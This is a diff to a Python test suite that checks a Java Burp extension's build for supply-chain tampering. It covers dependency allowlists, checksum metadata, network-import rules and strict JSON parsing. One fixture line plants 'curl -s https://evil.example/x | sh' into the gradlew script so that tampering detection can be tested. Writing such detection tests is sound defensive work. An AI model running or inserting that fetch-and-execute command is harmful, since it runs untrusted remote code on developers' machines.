@@ -285,7 +285,7 @@ BUILD_FIXTURES = {
                                "coordinate_not_allowed"),
     "allowed_coordinate_in_wrong_configuration": ("build.gradle", "compileOnly 'net.portswigger", "implementation 'net.portswigger",
                                                   "coordinate_not_allowed"),
-    "metadata_missing_for_declared": ("build.gradle", MONTOYA, MONTOYA + "    implementation 'com.google.code.gson:gson:2.15.0'\n",
+    "metadata_missing_for_declared": ("build.gradle", MONTOYA, MONTOYA.replace("montoya-api:2024.12", "montoya-api:2024.11"),
                                       "metadata_missing"),
     "dynamic_version": ("build.gradle", "montoya-api:2024.12'", "montoya-api:2024.+'", "dynamic_version"),
     "file_dependency": ("build.gradle", MONTOYA, MONTOYA + "    implementation files('libs/x.jar')\n", "dependency_notation"),
@@ -315,6 +315,16 @@ BUILD_FIXTURES = {
                                  "      <component group=\"com.squareup.okhttp3\" name=\"okhttp\" version=\"4.12.0\">\n"
                                  "         <artifact name=\"okhttp-4.12.0.jar\"><sha256 value=\"00\"/></artifact>\n"
                                  "      </component>\n   </components>", "metadata_extra_component"),
+    "error_prone_on_runtime_classpath": ("build.gradle", "compileOnly 'com.google.errorprone",
+                                         "implementation 'com.google.errorprone", "coordinate_not_allowed"),
+    "parent_pom_component_with_jar": ("gradle/verification-metadata.xml",
+                                      '<artifact name="gson-parent-2.15.0.pom">',
+                                      '<artifact name="gson-parent-2.15.0.jar"><sha256 value="00"/></artifact>\n'
+                                      '         <artifact name="gson-parent-2.15.0.pom">', "metadata_extra_component"),
+    "unknown_parent_pom": ("gradle/verification-metadata.xml", "   </components>",
+                           "      <component group=\"org.example\" name=\"example-parent\" version=\"1\">\n"
+                           "         <artifact name=\"example-parent-1.pom\"><sha256 value=\"00\"/></artifact>\n"
+                           "      </component>\n   </components>", "metadata_extra_component"),
     "gradlew_tampered": ("gradlew", "#!/bin/sh", "#!/bin/sh\ncurl -s https://evil.example/x | sh", "gradlew_script_mismatch"),
     "gradlew_bat_tampered": ("gradlew.bat", "@rem", "@rem tampered\r\n@rem", "gradlew_script_mismatch"),
 }
@@ -351,6 +361,13 @@ def test_real_metadata_and_wrapper_match_the_official_checksum_table():
     meta = (PROJECT / "gradle/verification-metadata.xml").read_text(encoding="utf-8")
     assert "7e6dffb645188492dfb5f512075c9196250efa18b673dfa270ee22fa20e16c5c" in meta  # montoya-api-2024.12.jar
     assert "5489cf5301cf6f2f204b2a92c00049362002541609622108b05ed0cd5248ec67" in meta  # montoya-api-2024.12.module
+    for sha in ("96d3dd843dc2911de01cdabcd50064cb9e860353102a0a78c96fd833d396fc7d",   # gson-2.15.0.jar
+                "426bc968a4e521865a58dd17a60389fed6195a1c357e3eb8bcb7cae31387bcae",   # gson-2.15.0.pom
+                "337664b30ade9b66e373b6efca1aba7421c1f8ff63643b8aa8b6d05d8efe8e8b",   # gson-parent-2.15.0.pom
+                "4667724877f1d37a689202da191e23efa7657c62eef93ccdac406eccfe5cdd0a",   # error_prone_annotations-2.50.0.jar
+                "71a0680d277324bab46bec4b00f6f111c1b794a931d0d8cda79bcb9246982f92",   # error_prone_annotations-2.50.0.pom
+                "abf45a019db125b50ff55134ec2af94ae3519761038adf0a60b9bd7b4b8b6254"):  # error_prone_parent-2.50.0.pom
+        assert sha in meta  # Maven Central .sha256·.sha1과 대조한 값(2부 PR-1b 0단계 a)
     props = (PROJECT / "gradle/wrapper/gradle-wrapper.properties").read_text(encoding="utf-8")
     assert f"distributionSha256Sum={jb.GRADLE_DISTRIBUTION_SHA256}" in props
 
@@ -457,6 +474,145 @@ def test_untouched_wrapper_runs_gradle_offline_as_control(tmp_path, monkeypatch)
     assert len(calls) == 1 and "--offline" in calls[0]
 
 
+# ─────────────────────────────── java_logic_isolation R1·R2′ (면제는 정본에서 기계 추출)
+CORE = f"{PKG}/transport/masker"
+
+
+def test_exemptions_are_machine_derived_from_the_canonical_models():
+    """R1 — 손 목록이 아니다: send = 금지 토큰 ∩ Envelope 하위 모델(필드 이름 ∪ Literal 값), response = 응답 모델 필드 이름."""
+    from sentinel import output_schema, schema
+    ex = jb.exempt_tokens()
+    every = {t for v in jb.forbidden_tokens().values() for t in v}
+    names, lits = jb._model_names([schema.Envelope])
+    assert ex["send"] == frozenset(every & (names | lits)) == frozenset({"truncated"})
+    rnames, _ = jb._model_names([schema.ExecutionResponse, output_schema.AnalysisResult])
+    assert ex["response"] == frozenset(every & rnames) == frozenset()
+    assert "truncated" in schema.Body.model_fields  # 면제의 근거가 정본에 실재
+
+
+def test_real_core_needs_r1_and_has_it():
+    """대조: 실제 코어는 `truncated`(Envelope 필드)를 쓴다 — R1이 없으면 위반이고, R1 덕분에 통과한다."""
+    files = jb._java_files(PROJECT)
+    assert "truncated" in jb.declared_identifiers([f for f in files if "/transport/masker/" in f.rel])
+    assert jb.logic_isolation_violations(PROJECT) == []
+
+
+R2_FIXTURES = {
+    # v1.48에 정한 위조: 소문자 enum 상수 confirmed(Gson 매핑 우회) → 거부
+    "lowercase_enum_constant": ({f"{PKG}/ui/Shown.java": "package sentinel.burp.ui;\n\nenum Shown { confirmed, other }\n"},
+                                f"{PKG}/ui/Shown.java"),
+    # v1.48에 정한 위조: 상수 클래스의 리터럴 → 거부
+    "constant_class_literal": ({f"{PKG}/ui/Words.java": "package sentinel.burp.ui;\n\nfinal class Words {\n"
+                                "    static final String A = \"confirmed\";\n}\n"}, f"{PKG}/ui/Words.java"),
+    # 우리 소스가 선언한 멤버를 다른 파일에서 '.이름'으로 부름 → 부른 쪽도 거부(외부 API가 아니다)
+    "declared_member_called_elsewhere": (
+        {f"{PKG}/ui/Names.java": "package sentinel.burp.ui;\n\nfinal class Names {\n    static int timeout() { return 1; }\n}\n",
+         f"{PKG}/ui/Caller.java": "package sentinel.burp.ui;\n\nfinal class Caller {\n    int x = Names.timeout();\n}\n"},
+        f"{PKG}/ui/Caller.java"),
+    # 판정 어휘가 주석에만 있어도 거부(보수적 — 면제는 외부 API 멤버 접근뿐)
+    "verdict_in_comment": ({f"{PKG}/ui/Note.java": "package sentinel.burp.ui;\n\n// confirmed\nfinal class Note {}\n"},
+                           f"{PKG}/ui/Note.java"),
+    # R1 send 면제는 transport에서만 — ui에서 Envelope 필드 이름을 쓰면 거부
+    "send_field_name_outside_transport": ({f"{PKG}/ui/Flag.java": "package sentinel.burp.ui;\n\nfinal class Flag {\n"
+                                           "    boolean truncated;\n}\n"}, f"{PKG}/ui/Flag.java"),
+    # R1 면제에 없는 판정 어휘는 transport에서도 거부
+    "unexempt_verdict_in_transport": ({f"{PKG}/transport/Wait.java": "package sentinel.burp.transport;\n\nfinal class Wait {\n"
+                                       "    int timeout = 3;\n}\n"}, f"{PKG}/transport/Wait.java"),
+}
+
+
+@pytest.mark.parametrize("name", sorted(R2_FIXTURES))
+def test_r2_fixture(tmp_path, name):
+    files, where = R2_FIXTURES[name]
+    project = _copy(tmp_path)
+    for rel, text in files.items():
+        _write(project, rel, text)
+    hits = {v.where for v in jb.logic_isolation_violations(project) if v.code == "forbidden_token_verdict"}
+    assert where in hits, (name, hits)
+
+
+def test_r2_external_api_member_call_passes_as_control(tmp_path):
+    """v1.48에 정한 대조: 우리 소스에 선언이 없는 외부 API 멤버 호출(JDK `.timeout(`)은 통과한다."""
+    project = _copy(tmp_path)
+    _write(project, f"{PKG}/ui/Deadline.java", "package sentinel.burp.ui;\n\nimport java.time.Duration;\n\n"
+           "final class Deadline {\n    Object apply(java.util.function.Function<Duration, Object> builder) {\n"
+           "        return builder.apply(Duration.ofSeconds(1));\n    }\n    void call(Object b) {\n"
+           "        ((Builder) b).timeout(Duration.ofSeconds(2));\n    }\n    interface Builder { }\n}\n")
+    _edit(project, f"{PKG}/ui/Deadline.java", "    interface Builder { }\n", "")
+    assert jb.logic_isolation_violations(project) == []
+
+
+def test_r1_send_field_in_transport_passes_as_control(tmp_path):
+    project = _copy(tmp_path)
+    _write(project, f"{PKG}/transport/Cut.java", "package sentinel.burp.transport;\n\nfinal class Cut {\n"
+           "    boolean truncated;\n    static final String KEY = \"truncated\";\n}\n")
+    assert jb.logic_isolation_violations(project) == []
+
+
+# ─────────────────────────────── java_no_target_send: transport.* Montoya 0, 마스커 코어 java.net 0
+CORE_FIXTURES = {
+    "transport_montoya_import": (f"{PKG}/transport/Bridge.java", "package sentinel.burp.transport;\n\n"
+                                 "import burp.api.montoya.http.message.HttpRequestResponse;\n\nfinal class Bridge {}\n",
+                                 "transport_montoya_import"),
+    "transport_montoya_fqn": (f"{PKG}/transport/Bridge.java", "package sentinel.burp.transport;\n\nfinal class Bridge {\n"
+                              "    burp.api.montoya.MontoyaApi api;\n}\n", "transport_montoya_import"),
+    "core_java_net_import": (f"{CORE}/Decode.java", "package sentinel.burp.transport.masker;\n\nimport java.net.URLDecoder;\n\n"
+                             "final class Decode {}\n", "core_java_net"),
+    "core_java_net_fqn": (f"{CORE}/Decode.java", "package sentinel.burp.transport.masker;\n\nfinal class Decode {\n"
+                          "    String d(String s) { return java.net.URLDecoder.decode(s, java.nio.charset.StandardCharsets.UTF_8); }\n}\n",
+                          "core_java_net"),
+    "core_java_net_static_import": (f"{CORE}/Decode.java", "package sentinel.burp.transport.masker;\n\n"
+                                    "import static java.net.URLDecoder.decode;\n\nfinal class Decode {}\n", "core_java_net"),
+}
+
+
+@pytest.mark.parametrize("name", sorted(CORE_FIXTURES))
+def test_core_and_transport_fixture_is_rejected(tmp_path, name):
+    rel, text, expected = CORE_FIXTURES[name]
+    project = _copy(tmp_path)
+    _write(project, rel, text)
+    assert expected in _codes(jb.no_target_send_violations(project), jb.NO_TARGET_SEND), name
+
+
+def test_java_net_outside_core_is_not_the_core_rule(tmp_path):
+    """대조: 코어 규칙은 transport.masker에만 걸린다(그 밖의 java.net은 java_loopback_only가 따로 본다)."""
+    project = _copy(tmp_path)
+    _write(project, f"{PKG}/transport/Sender.java", "package sentinel.burp.transport;\n\nimport java.net.http.HttpClient;\n\n"
+           "final class Sender {}\n")
+    assert "core_java_net" not in _codes(jb.no_target_send_violations(project))
+
+
+# ─────────────────────────────── java_masker_parity 정적 하위 검사: 관대한 Gson API 금지
+LENIENT_FIXTURES = {
+    "json_parser_parse_string": ("Object v = com.google.gson.JsonParser.parseString(s);", "lenient_json_json_parser"),
+    "json_parser_parse_reader": ("Object v = JsonParser.parseReader(r);", "lenient_json_json_parser"),
+    "static_import_parse_string": ("Object v = parseString(s);", "lenient_json_json_parser"),
+    "gson_from_json": ("Object v = new com.google.gson.Gson().fromJson(s, Object.class);", "lenient_json_gson_convert"),
+    "gson_to_json": ("String v = new com.google.gson.Gson().toJson(s);", "lenient_json_gson_convert"),
+    "gson_builder": ("Object g = new com.google.gson.GsonBuilder().create();", "lenient_json_gson_builder"),
+    "set_lenient": ("r.setLenient(true);", "lenient_json_set_lenient"),
+    "strictness_lenient": ("r.setStrictness(com.google.gson.Strictness.LENIENT);", "lenient_json_lenient_strictness"),
+    "strictness_legacy": ("r.setStrictness(com.google.gson.Strictness.LEGACY_STRICT);", "lenient_json_lenient_strictness"),
+    "reader_without_strict": ("Object r = new com.google.gson.stream.JsonReader(new java.io.StringReader(s));",
+                              "json_reader_not_strict"),
+}
+
+
+@pytest.mark.parametrize("name", sorted(LENIENT_FIXTURES))
+def test_lenient_json_fixture_is_rejected(tmp_path, name):
+    stmt, expected = LENIENT_FIXTURES[name]
+    project = _copy(tmp_path)
+    _write(project, f"{CORE}/Loose.java", "package sentinel.burp.transport.masker;\n\nfinal class Loose {\n"
+           f"    void f(String s, com.google.gson.stream.JsonReader r) {{\n        {stmt}\n    }}\n}}\n")
+    assert expected in _codes(jb.lenient_json_violations(project), jb.MASKER_PARITY), name
+
+
+def test_real_core_uses_only_the_strict_reader():
+    assert jb.lenient_json_violations(PROJECT) == []
+    core = (PROJECT / "src/main/java" / "sentinel/burp/transport/masker/StrictJson.java").read_text(encoding="utf-8")
+    assert "setStrictness(Strictness.STRICT)" in core and "new JsonReader(" in core
+
+
 # ─────────────────────────────── 변이 확인(변이본 로드 표지 확인 후 결과 해석)
 STAMP = "java_boundary_probe"
 _DRIVER = """
@@ -480,6 +636,14 @@ MUTATIONS = {
                               [_T + "test_logic_isolation_fixture_is_rejected[two_entry_points]"]),
     "build_coordinate_allowlist_off": (_JB, "        if (conf, g, a) not in ALLOWED_COORDS:\n", "        if False:\n",
                                        [_T + "test_build_egress_fixture_is_rejected[coordinate_not_allowed]"]),
+    "r2_declared_identifier_check_removed": (_JB, "        if _member_access(f.lexed.code, m.start()) and token not in declared:\n",
+                                             "        if _member_access(f.lexed.code, m.start()):\n",
+                                             [_T + "test_r2_fixture[declared_member_called_elsewhere]"]),
+    "lenient_json_check_off": (_JB, "            if rx.search(code):\n                out.append(Violation(MASKER_PARITY",
+                               "            if False:\n                out.append(Violation(MASKER_PARITY",
+                               [_T + "test_lenient_json_fixture_is_rejected[json_parser_parse_string]"]),
+    "core_java_net_rule_off": (_JB, "        if _in_core(f, root) and re.search(", "        if False and re.search(",
+                               [_T + "test_core_and_transport_fixture_is_rejected[core_java_net_import]"]),
     "preflight_wrapper_check_removed": (_BUILD, "    problems = [f\"wrapper 고정값 위반: {v.code}\" for v in "
                                                 "java_boundary.wrapper_violations(project)]\n",
                                         "    problems = []\n",
